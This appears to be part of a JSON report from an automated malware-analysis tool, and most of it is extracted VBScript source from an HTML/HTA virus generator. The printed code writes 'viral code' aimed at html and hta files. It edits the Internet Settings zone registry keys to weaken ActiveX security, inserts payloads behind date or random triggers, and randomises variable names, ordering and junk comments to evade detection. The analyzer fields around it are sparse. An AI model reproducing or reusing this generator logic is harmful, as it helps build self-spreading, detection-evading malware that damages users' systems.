            "\t\t\t\t\tif Upper = 0 then ExtenList = ExtenList + \"\"\"html\"\"\"",
            "\t\t\t\t\tCheckedAny = true",
            "\t\t\t\tend if",
            "\t\t\t\tHTMLChecked = True",
            "\t\t\tCase 4 and HTAChecked = False",
            "\t\t\t\tif VInfo.HTA.checked = true then",
            "\t\t\t\t\tif CheckedAny = true then ExtenList = ExtenList & \" or \" & VarExtType & \" = \"",
            "\t\t\t\t\tif Upper = 1 then ExtenList = ExtenList + \"\"\"HTA\"\"\"",
            "\t\t\t\t\tif Upper = 0 then ExtenList = ExtenList + \"\"\"hta\"\"\"",
            "\t\t\t\t\tCheckedAny = true",
            "\t\t\t\tend if",
            "\t\t\t\tHTAChecked = True",
            "\t\t\tCase 5 and MiscChecked = False",
            "\t\t\t\tif VInfo.MiscExt.checked then",
            "\t\t\t\t\tif CheckedAny = true then ExtenList = ExtenList & \" or \" & VarExtType & \" = \"",
            "\t\t\t\t\tif Upper = 1 then ExtenList = ExtenList + \"\"\"\" + Ucase(VInfo.ExtName.Value) + \"\"\"\"",
            "\t\t\t\t\tif Upper = 0 then ExtenList = ExtenList + \"\"\"\" + Lcase(VInfo.ExtName.Value) + \"\"\"\"",
            "\t\t\t\t\tCheckedAny = true",
            "\t\t\t\tend if",
            "\t\t\t\tMiscChecked = True",
            "\t\tEnd Select",
            "\tLoop while MiscChecked = False or HTAChecked = False or HTMLChecked = False or HTMchecked = False or HTTChecked = False",
            "\tParseExtensions = ExtenList",
            "end function",
            "'-----------------------------------Registry Hacking Procedures----------------------------------",
            "Sub AVRegHackBegin",
            "\tif VInfo.Current.Checked = True OR VInfo.Local.Checked = True then",
            "\t\tif WSCreated <> True then",
            "\t\t\tAddCodeLine \"Set \" & VarWSObj & \" = CreateObject(\"\"WScript.Shell\"\")\"",
            "\t\t\tWSCreated = True",
            "\t\tend if",
            "\tend if",
            "End Sub",
            "Sub AVRegHackA",
            "\tif VInfo.Current.checked = True then",
            "\t\tAddCodeLine VarWSObj & \".Regwrite\" & RandString(\"\"\"HKCU\",\"\"\"HKEY_CURRENT_USER\") & \"\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\0\\1201\"\" , 0, \"\"REG_DWORD\"\"\"",
            "\tend if",
            "End Sub",
            "Sub AVRegHackB",
            "\tif VInfo.Local.Checked = True then",
            "\t\tAddCodeLine VarWSObj & \".RegWrite\" & RandString(\"\"\"HKLM\", \"\"\"HKEY_LOCAL_MACHINE\") & \"\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\0\\1201\"\" , 0, \"\"REG_DWORD\"\"\"",
            "\tend if",
            "End Sub",
            "'---------------------------------Conditional Payload Block--------------------------------------",
            "'Inserts the chosen payload trigger conditional statement to the viral code text stream",
            "'And calls the insertion of the payload if appropriate",
            "Sub PayLoadCheck",
            "\tif GetVals(Vinfo.Trigger) <> \"None\" then",
            "\t\tBaseString = \"\"",
            "\t\tBonusString = \"\"",
            "\t\tif VInfo.TriggerOffline.Checked = True then BaseString = \"location.protocol = \"\"file:\"\"\"",
            "\t\tSelect Case GetVals(VInfo.Trigger)",
            "\t\t\tCase \"Every\"",
            "\t\t\t\tBonusString = \"\"",
            "\t\t\tCase \"Day\"",
            "\t\t\t\tBonusString = \"Day(now) = \" & VInfo.DayValTrig.Value",
            "\t\t\tCase \"Week\"",
            "\t\t\t\tBonusString = \"WeekDay(now) = \" & VInfo.WeekDayTrig.Value",
            "\t\t\tCase \"Misc\"",
            "\t\t\t\tBonusString = VInfo.TrigLine.Value",
            "\t\t\tCase \"Rand\"",
            "\t\t\t\tBonusString = \"Int((\" & VInfo.TrigMax.Value & \" * Rnd) + 1) = 1\"",
            "\t\tEnd Select",
            "\t\tif BaseString <> \"\" or BonusString <> \"\" then",
            "\t\t\tAddCodeLine RandomAndAdd(BaseString, BonusString)",
            "\t\t\tTabAmount = TabAmount + 1",
            "\t\tend if",
            "\t\tif GetVals(VInfo.PayLoad) = \"Prepend\" then",
            "\t\t\tAddCodeLine \"window.status=\"\"HTML.Prepend /1nternal\"\")\"",
            "\t\telse",
            "\t\t\tCall InsertPayLoad(GetVals(Vinfo.PayLoad))",
            "\t\tend if",
            "\t\tif BaseString <> \"\" OR BonusString <> \"\" then ",
            "\t\t\tTabAmount = TabAmount - 1",
            "\t\t\tAddCodeLine \"end if\"",
            "\t\tend if",
            "\tend if",
            "End Sub",
            "'----------------------------------------Misc Procedures-----------------------------------------",
            "'Randomly brackets an argument",
            "function RandBrack(String1)",
            "\tif Int((2 * Rnd) + 1) = 1 then",
            "\t\tRandBrack = \"(\" + String1 + \")\"",
            "\telse",
            "\t\tRandBrack = \" \" + String1",
            "\tend if",
            "end function",
            "'Opens a file using the chosen method",
            "'All args are strings",
            "Sub OpenFileMethod(FilePathName, IoModeType, CreateIt)",
            "\tSelect Case GetVals(VInfo.OpenMethod)",
            "\t\tCase \"TextFile\"",
            "\t\t\tCall OpenUsingText(FilePathName, IoModeType, CreateIt)",
            "\t\tCase \"TextStream\"",
            "\t\t\tCall OpenUsingStream(FilePathName, IoModeType)",
            "\t\tCase \"Rand\"",
            "\t\t\tif Int((2 * Rnd) + 1) = 1 then",
            "\t\t\t\tCall OpenUsingText(FilePathName, IoModeType, CreateIt)",
            "\t\t\telse",
            "\t\t\t\tCall OpenUsingStream(FilePathName, IoModeType)",
            "\t\t\tend if",
            "\tend select",
            "end sub",
            "Sub OpenUsingStream(FilePathName, IoModeType)",
            "\tAddCodeLine \"Set \" & VarVictFileObj & \" = \" & VarFSOObj & \".GetFile(\" & FilePathName & \")\"",
            "\tAddCodeLine \"Set \" & VarTextStreamObj & \" = \" & VarVictFileObj & \".OpenAsTextStream(\" & IoModeType & \")\"",
            "End Sub",
            "Sub OpenUsingText(FilePathName, IoModeType, CreateIt)",
            "\tAddCodeLine \"Set \" & VarTextStreamObj & \" = \" & VarFSOObj & \".OpenTextFile(\" & FilePathName & \", \" & IoModeType & \", \" & CreateIt & \")\"",
            "End Sub",
            "'Adds a line to te viral code text stream with a CRLF",
            "Sub AddLine(TabstoAdd, TextToAdd)",
            "\tfor i = 1 to TabstoAdd",
            "\t\tGenText = GenText & \"\t\"",
            "\tnext",
            "\tGenText = GenText & TextToAdd + Chr(13) + Chr(10)",
            "\tLinesCount = LinesCount + 1",
            "\twindow.status = \"Generating... \" & LinesCount & \" Lines\"",
            "End Sub",
            "'Adds a line to the viral code text stream, randomly adding a junk afterwards if checked",
            "Sub AddCodeLine(TextToAdd)",
            "\tif TextToAdd <> \"\" then",
            "\t\tif Int((2 * Rnd) + 1) = 1 AND VInfo.JComments.Checked = True then",
            "\t\t\tJunkString = \" '\"",
            "\t\t\tfor i = 1 to Int((20 * Rnd) + 20)",
            "\t\t\t\tJunkString = JunkString & Chr(Int((74 * Rnd) + 48))",
            "\t\t\tnext",
            "\t\t\tTextToAdd = TextToAdd & JunkString",
            "\t\tend if",
            "\t\tAddLine TabAmount, TextToAdd",
            "\t\tif Int((2 * Rnd) + 1) = 1 AND VInfo.JunkLines.Checked = True then",
            "\t\t\tJunkString = \"'\"",
            "\t\t\tfor i = 1 to Int((20 * Rnd) + 20)",
            "\t\t\t\tJunkString = JunkString & Chr(Int((74 * Rnd) + 48))",
            "\t\t\tnext",
            "\t\t\tAddLine TabAmount, JunkString",
            "\t\tend if",
            "\tend if",
            "End sub",
            "'Parses code into several lines",
            "Sub AddMultiCodeLine(Parsing)",
            "\tCurPos = 1",
            "\tParsing = Parsing & Chr(13) & Chr(10)",
            "\tDo ",
            "\t\tNextPos = InStr(CurPos, Parsing, Chr(13) & Chr(10))",
            "\t\tif NextPos > 0 then",
            "\t\t\tCurLine = Mid(Parsing, CurPos, NextPos - CurPos)",
            "\t\t\tAddCodeLine CurLine",
            "\t\t\tCurPos = NextPos + 2",
            "\t\tend if",
            "\tLoop While NextPos > 0",
            "End Sub",
            "'Randomly returns one of two strings",
            "Function RandString(String1, String2)",
            "\tif Int((2 * Rnd) + 1) = 1 then",
            "\t\tRandString = String1",
            "\telse",
            "\t\tRandString = String2",
            "\tend if",
            "End Function",
            "'Inserts a conditional statement in random order.",
            "Function RandomAndAdd(String1, String2)",
            "\tif String1 <> \"\" and String2 <> \"\" then",
            "\t\tRandomAndAdd = RandString(\"if \" & String1 & \" and \" & String2 & \" then\", \"if \" & String2 & \" AND \" & String1 & \" then\")",
            "\telseif String1 = \"\" and String2 = \"\" then",
            "\t\tTabAmount = TabAmount - 1",
            "\t\tRandomAndAdd = \"\"",
            "\telse",
            "\t\tRandomAndAdd = \"if \" & String1 & String2 & \" then\"",
            "\tend if",
            "End Function",
            "'Inserts two strings in random order using AddCodeLine",
            "'If String1 or String2 = \"\" it doesn't insert it",
            "'ModTab = 0 to not modify tabbing",
            "'ModTab = 1 to indent string2 if its placed below",
            "'ModTab = 2 to indent string2 if its placed above",
            "Sub RandOrder(String1, String2, ModTab)",
            "\tif Int((2 * Rnd) + 1) = 1 then",
            "\t\tAddCodeLine String1",
            "\t\tif ModTab = 1 then TabAmount = TabAmount + 1",
            "\t\tAddCodeLine String2",
            "\t\tif ModTab = 1 then TabAmount = TabAmount - 1",
            "\telse",
            "\t\tif ModTab = 2 then TabAmount = TabAmount + 1",
            "\t\tAddCodeLine String2",
            "\t\tif ModTab = 2 then TabAmount = TabAmount - 1",
            "\t\tAddCodeLine String1",
            "\tend if",
            "End Sub",
            "'Returns the value of the chosen radio button within a radio button array",
            "Function GetVals(ArrList)",
            "\tfor i = 0 to (ArrList.length - 1)",
            "\t\tif ArrList(i).Checked = True then GetVals = ArrList(i).Value",
            "\tnext",
            "End function",
            "'Generates a random stream of lower case characters",
            "function GenVar",
            "\tfor i = 1 to Int((10 * Rnd) + 5)",
            "\t\tGenVar = GenVar & Chr(Int((26 * Rnd) + 97))",
            "\tnext",
            "End Function"
        ],
        "file": {},
        "fuzzing": {
            "Possible connections": [
                "\t\t\tCurLine = Mid(Parsing, CurPos, NextPos - CurPos)",
                "\t\t\tAddCodeLine CurLine"
            ]
        },
        "ip": [],
        "url": [
            "file:///",
            "file:\\\\\\"
        ]
    },
    "time": "0:00:00.414413",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
